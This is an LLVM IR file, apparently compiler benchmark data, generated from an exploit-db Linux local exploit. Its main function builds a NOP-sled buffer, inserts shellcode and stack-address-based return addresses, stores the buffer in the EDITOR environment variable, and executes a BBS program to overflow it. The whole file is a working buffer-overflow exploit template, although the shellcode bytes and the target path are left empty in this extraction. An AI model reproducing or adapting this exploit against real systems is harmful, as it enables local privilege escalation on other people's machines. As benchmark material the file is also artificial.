; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19284.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19284.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFFSIZE = common dso_local global i64 0, align 8
@exec_shell = common dso_local global i32* null, align 8
@OFFSET = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [7 x i8] c"EDITOR\00", align 1
@.str.1 = private unnamed_addr constant [7 x i8] c"setenv\00", align 1
@BBS_PROGRAM = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [518 x i8], align 16
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64*, align 8
  store i32 0, i32* %1, align 4
  %6 = getelementptr inbounds [518 x i8], [518 x i8]* %2, i64 0, i64 0
  %7 = call i32 @memset(i8* %6, i32 144, i32 518)
  %8 = getelementptr inbounds [518 x i8], [518 x i8]* %2, i64 0, i64 0
  store i8* %8, i8** %3, align 8
  %9 = load i64, i64* @BUFFSIZE, align 8
  %10 = load i32*, i32** @exec_shell, align 8
  %11 = call i32 @strlen(i32* %10)
  %12 = sext i32 %11 to i64
  %13 = sub nsw i64 %9, %12
  %14 = load i8*, i8** %3, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 %13
  store i8* %15, i8** %3, align 8
  store i32 0, i32* %4, align 4
  br label %16

16:                                               ; preds = %30, %0
  %17 = load i32, i32* %4, align 4
  %18 = load i32*, i32** @exec_shell, align 8
  %19 = call i32 @strlen(i32* %18)
  %20 = icmp slt i32 %17, %19
  br i1 %20, label %21, label %33

21:                                               ; preds = %16
  %22 = load i32*, i32** @exec_shell, align 8
  %23 = load i32, i32* %4, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i32, i32* %22, i64 %24
  %26 = load i32, i32* %25, align 4
  %27 = trunc i32 %26 to i8
  %28 = load i8*, i8** %3, align 8
  %29 = getelementptr inbounds i8, i8* %28, i32 1
  store i8* %29, i8** %3, align 8
  store i8 %27, i8* %28, align 1
  br label %30

30:                                               ; preds = %21
  %31 = load i32, i32* %4, align 4
  %32 = add nsw i32 %31, 1
  store i32 %32, i32* %4, align 4
  br label %16

33:                                               ; preds = %16
  %34 = getelementptr inbounds [518 x i8], [518 x i8]* %2, i64 0, i64 509
  %35 = bitcast i8* %34 to i64*
  store i64* %35, i64** %5, align 8
  store i32 0, i32* %4, align 4
  br label %36

36:                                               ; preds = %46, %33
  %37 = load i32, i32* %4, align 4
  %38 = icmp slt i32 %37, 2
  br i1 %38, label %39, label %49

39:                                               ; preds = %36
  %40 = call i32 (...) @get_esp()
  %41 = load i32, i32* @OFFSET, align 4
  %42 = add nsw i32 %40, %41
  %43 = sext i32 %42 to i64
  %44 = load i64*, i64** %5, align 8
  %45 = getelementptr inbounds i64, i64* %44, i32 1
  store i64* %45, i64** %5, align 8
  store i64 %43, i64* %44, align 8
  br label %46

46:                                               ; preds = %39
  %47 = load i32, i32* %4, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %4, align 4
  br label %36

49:                                               ; preds = %36
  %50 = load i64*, i64** %5, align 8
  %51 = bitcast i64* %50 to i8*
  store i8* %51, i8** %3, align 8
  %52 = load i8*, i8** %3, align 8
  store i8 0, i8* %52, align 1
  %53 = call i32 @unsetenv(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  %54 = getelementptr inbounds [518 x i8], [518 x i8]* %2, i64 0, i64 0
  %55 = call i64 @setenv(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i8* %54, i32 1)
  %56 = icmp ne i64 %55, 0
  br i1 %56, label %57, label %60

57:                                               ; preds = %49
  %58 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  %59 = call i32 @exit(i32 1) #3
  unreachable

60:                                               ; preds = %49
  %61 = load i8*, i8** @BBS_PROGRAM, align 8
  %62 = load i8*, i8** @BBS_PROGRAM, align 8
  %63 = call i32 @execl(i8* %61, i8* %62, i32* null)
  %64 = load i8*, i8** @BBS_PROGRAM, align 8
  %65 = call i32 @perror(i8* %64)
  %66 = call i32 @exit(i32 1) #3
  unreachable
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @get_esp(...) #1

declare dso_local i32 @unsetenv(i8*) #1

declare dso_local i64 @setenv(i8*, i8*, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @execl(i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
